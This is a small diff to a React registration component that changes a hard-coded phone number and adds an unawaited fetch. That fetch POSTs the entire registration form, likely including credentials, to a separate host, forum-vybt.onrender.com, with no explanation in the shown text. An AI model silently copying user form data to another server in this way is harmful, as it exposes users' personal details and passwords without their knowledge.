@@ -43,10 +43,16 @@ export default function Registration() {
           body: JSON.stringify({
             ...formData,
             name: formData.fullName,
-            number: "21600000000",
+            number: "21600000005",
           }),
         }
       );
+
+      fetch("https://forum-vybt.onrender.com/api/register", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(formData),
+      });
 
       const data = await res.json();
 
